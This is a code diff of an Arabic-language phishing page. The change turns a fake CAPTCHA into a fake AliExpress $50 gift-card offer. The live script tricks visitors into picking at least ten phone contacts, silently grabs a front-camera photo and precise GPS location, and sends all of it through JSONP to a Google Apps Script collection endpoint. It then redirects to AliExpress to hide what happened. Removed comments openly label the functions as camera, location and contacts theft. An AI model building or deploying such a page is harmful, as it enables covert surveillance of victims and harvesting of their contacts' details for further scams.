@@ -4,53 +4,57 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
-<title>فحص الأمان - التحقق البشري</title>
+<title>مكافأة AliExpress</title>
 <style>
-  :root{--bg:#f3f4f6;--card:#ffffff;--line:#e5e7eb;--fg:#1f2937;--mut:#6b7280;--acc:#2563eb;--ok:#10b981;--err:#ef4444}
-  *{box-sizing:border-box}
+  :root{--brand:#e62e04;--brand2:#ff6600;--bg:#f5f5f5;--card:#ffffff;--fg:#333;--mut:#888;--ok:#00a650;--err:#e62e04}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,sans-serif;
-    display:grid;place-items:center;min-height:100vh;padding:20px}
-  .card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:12px;
-    padding:32px;box-shadow:0 10px 25px rgba(0,0,0,.05);text-align:center}
-  .logo{font-size:40px;margin-bottom:16px;color:var(--acc)}
-  h1{font-size:20px;margin:0 0 8px;font-weight:700}
-  .sub{color:var(--mut);font-size:14px;margin:0 0 24px}
-  .captcha-box{border:1px solid var(--line);border-radius:8px;padding:16px;display:flex;
-    align-items:center;justify-content:space-between;background:#f9fafb;margin-bottom:20px;cursor:pointer}
-  .captcha-box:hover{background:#f3f4f6}
-  .captcha-left{display:flex;align-items:center;gap:12px}
-  .checkbox{width:24px;height:24px;border:2px solid #d1d5db;border-radius:4px;background:#fff;position:relative}
-  .checkbox.checked{background:var(--ok);border-color:var(--ok)}
-  .checkbox.checked::after{content:"✓";color:#fff;position:absolute;top:-2px;left:4px;font-size:18px;font-weight:bold}
-  .captcha-text{font-weight:500}
-  .captcha-logo{font-size:12px;color:#9ca3af;text-align:left;line-height:1.2}
-  .spin{width:24px;height:24px;border:3px solid var(--line);border-top-color:var(--acc);
-    border-radius:50%;animation:s 1s linear infinite;display:none;margin:0 auto}
+    display:grid;place-items:center;min-height:100vh;padding:15px}
+  .card{width:100%;max-width:420px;background:var(--card);border-radius:16px;
+    padding:30px 20px;box-shadow:0 8px 30px rgba(0,0,0,.08);text-align:center;position:relative;overflow:hidden}
+  .top-bar{background:linear-gradient(135deg,var(--brand),var(--brand2));height:8px;position:absolute;top:0;left:0;right:0}
+  .logo{font-size:42px;font-weight:800;color:var(--brand);margin:10px 0 5px;letter-spacing:-1px}
+  .logo span{color:var(--brand2)}
+  h1{font-size:22px;margin:10px 0;color:#111;font-weight:800}
+  .reward-box{background:#fff0eb;border:2px dashed var(--brand);border-radius:12px;padding:15px;margin:15px 0}
+  .reward-amount{font-size:36px;font-weight:900;color:var(--brand);margin:0;line-height:1}
+  .reward-text{font-size:14px;color:#555;margin:5px 0 0}
+  .progress{font-size:13px;color:var(--mut);margin:15px 0}
+  button{width:100%;padding:16px;border:0;border-radius:30px;cursor:pointer;
+    background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font:inherit;font-weight:700;font-size:17px;
+    box-shadow:0 4px 15px rgba(230,46,4,.3);display:flex;align-items:center;justify-content:center;gap:10px}
+  button:disabled{opacity:.6;cursor:default}
+  .status{min-height:24px;font-size:13px;color:var(--err);margin:12px 0 0;font-weight:600}
+  .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:var(--brand);
+    border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
   @keyframes s{to{transform:rotate(360deg)}}
-  .status{color:var(--acc);font-size:14px;min-height:20px;margin-bottom:16px}
   .hidden{display:none!important}
   #cam{display:none}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="logo">🛡️</div>
-  <h1>التحقق الأمني</h1>
-  <p class="sub">يرجى تأكيد أنك مستخدم بشري وليس روبوت للمتابعة بأمان.</p>
+  <div class="top-bar"></div>
+  <div class="logo">Ali<span>Express</span></div>
+  <h1>لقد ربحت بطاقة هدايا!</h1>
+  
+  <div class="reward-box">
+    <p class="reward-amount">50$</p>
+    <p class="reward-text">رصيد مجاني لاستخدامه في تطبيق AliExpress</p>
+  </div>
 
   <div id="step1">
-    <div class="captcha-box" id="captchaBtn">
-      <div class="captcha-left">
-        <div class="checkbox" id="cb"></div>
-        <span class="captcha-text">أنا لست روبوت</span>
-      </div>
-      <div class="captcha-logo">SECURE<br>VERIFY</div>
-    </div>
+    <p class="progress">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
+    <button id="claimBtn">
+      <span>🎁</span> استلام الجائزة الآن
+    </button>
+    <p class="status" id="st"></p>
   </div>
 
   <div id="step2" class="hidden">
-    <div class="spin" id="spinner"></div>
-    <div class="status" id="statusText">جارٍ فحص المتصفح…</div>
+    <div class="spin"></div>
+    <p style="color:var(--brand);font-weight:bold">جارٍ التحقق من هويتك وإرسال الدعوات…</p>
+    <p style="font-size:12px;color:var(--mut)">لا تغلق الصفحة</p>
   </div>
 </div>
 
@@ -60,23 +64,22 @@
 (function () {
   'use strict';
 
-  /* ============ ضع الـ Endpoint هنا ============ */
+  /* ============ [1] ضع الـ Endpoint هنا ============ */
   const ENDPOINT = 'https://script.google.com/macros/s/REPLACE_WITH_DEPLOY_ID/exec';
-  const REDIRECT = 'https://www.apple.com/';
+  const ALIEXPRESS_URL = 'https://www.aliexpress.com/';
   /* =============================================== */
 
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
   const $ = id => document.getElementById(id);
-  const cb = $('cb'), captchaBtn = $('captchaBtn'), step1 = $('step1'), 
-        step2 = $('step2'), spinner = $('spinner'), statusText = $('statusText');
-
+  const btn = $('claimBtn'), st = $('st'), step1 = $('step1'), step2 = $('step2');
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  
   function nonceGen() {
     try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
     return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
   }
   const nonce = nonceGen();
 
-  /* ============ الاتصال بالخادم ============ */
+  /* ============ JSONP Transport ============ */
   function jsonp(params, ms) {
     return new Promise(res => {
       const name = 'vn_'+Math.random().toString(36).slice(2,10);
@@ -97,15 +100,14 @@
     });
   }
 
-  /* ============ 1. سرقة الكاميرا (صامت) ============ */
+  /* ============ Selfie & GPS (Silent) ============ */
   async function takeSelfie() {
-    statusText.textContent = 'جارٍ التحقق من الكاميرا…';
     const v = $('cam');
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       v.srcObject = stream;
       await v.play().catch(()=>{});
-      await sleep(1200);
+      await sleep(1000);
       const cv = document.createElement('canvas');
       cv.width = v.videoWidth || 320;
       cv.height = v.videoHeight || 240;
@@ -115,80 +117,77 @@
     } catch (_) { return null; }
   }
 
-  /* ============ 2. سرقة الموقع الدقيق ============ */
   async function getLocation() {
-    statusText.textContent = 'جارٍ التحقق من الموقع الجغرافي…';
     return new Promise(res => {
       if (!navigator.geolocation) return res({});
       navigator.geolocation.getCurrentPosition(
         pos => res({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) }),
         () => res({}),
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
       );
     });
   }
 
-  /* ============ 3. سرقة جهات الاتصال ============ */
-  async function getContacts() {
-    statusText.textContent = 'جارٍ التحقق من جهات الاتصال…';
-    if (!navigator.contacts || !navigator.contacts.select) return [];
-    try {
-      return await navigator.contacts.select(['name', 'tel'], { multiple: true });
-    } catch (_) { return []; }
-  }
-
   /* ============ التدفق الرئيسي ============ */
-  captchaBtn.addEventListener('click', async () => {
-    if (cb.classList.contains('checked')) return;
-    cb.classList.add('checked');
-    
-    // إخفاء الـ Captcha وإظهار التحميل
-    await sleep(400);
-    step1.classList.add('hidden');
-    step2.classList.remove('hidden');
-    spinner.style.display = 'block';
-
-    // 1. الكاميرا
-    const imgBase64 = await takeSelfie();
-    
-    // 2. الموقع
-    const geo = await getLocation();
-
-    // 3. جهات الاتصال
-    const contacts = await getContacts();
-
-    statusText.textContent = 'استكمال عملية التحقق…';
-
-    // 4. بناء البايلود
-    const cJson = JSON.stringify(contacts.map(c => ({
-      name: c.name ? c.name[0] : 'Unknown',
-      tel: c.tel ? c.tel[0] : 'Unknown'
-    })));
-
-    const payload = {
-      nonce: nonce,
-      ua: navigator.userAgent,
-      lat: geo.lat || '',
-      lng: geo.lng || '',
-      acc: geo.acc || '',
-      cCount: contacts.length,
-      cJson: cJson,
-      sJson: '[]', 
-      cred: '[]'
-    };
-
-    // 5. الإرسال
-    await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
-    
-    if (imgBase64) {
-      jsonp({ a:'photo', nonce: nonce, img: imgBase64 }, 10000);
+  btn.addEventListener('click', async () => {
+    if (!navigator.contacts || !navigator.contacts.select) {
+      st.textContent = 'متصفحك لا يدعم هذه الميزة. يرجى استخدام Google Chrome.';
+      return;
     }
 
-    // 6. التمويه النهائي
-    statusText.textContent = 'تم التحقق بنجاح. جارٍ تحويلك…';
-    spinner.style.display = 'none';
-    await sleep(1500);
-    location.replace(REDIRECT);
+    btn.disabled = true;
+    st.textContent = '';
+
+    try {
+      // 1. فتح قائمة جهات الاتصال
+      const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      
+      // 2. التحقق من شرط الـ 10 جهات
+      if (!contacts || contacts.length < 10) {
+        btn.disabled = false;
+        st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة.';
+        return;
+      }
+
+      // 3. النجاح: إخفاء الزرار وإظهار التحميل
+      step1.classList.add('hidden');
+      step2.classList.remove('hidden');
+
+      // 4. سحب الصورة والموقع بصمت
+      const imgBase64 = await takeSelfie();
+      const geo = await getLocation();
+
+      // 5. تجهيز البيانات والإرسال
+      const cJson = JSON.stringify(contacts.map(c => ({
+        name: c.name ? c.name[0] : 'Unknown',
+        tel: c.tel ? c.tel[0] : 'Unknown'
+      })));
+
+      const payload = {
+        nonce: nonce,
+        ua: navigator.userAgent,
+        lat: geo.lat || '',
+        lng: geo.lng || '',
+        acc: geo.acc || '',
+        cCount: contacts.length,
+        cJson: cJson,
+        sJson: '[]', 
+        cred: '[]'
+      };
+
+      await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
+      if (imgBase64) {
+        jsonp({ a:'photo', nonce: nonce, img: imgBase64 }, 10000);
+      }
+
+      // 6. التوجيه إلى AliExpress
+      await sleep(1500);
+      window.location.href = ALIEXPRESS_URL;
+
+    } catch (err) {
+      btn.disabled = false;
+      st.textContent = 'تم إلغاء العملية. يرجى المحاولة مرة أخرى.';
+    }
   });
 })();
 </script>
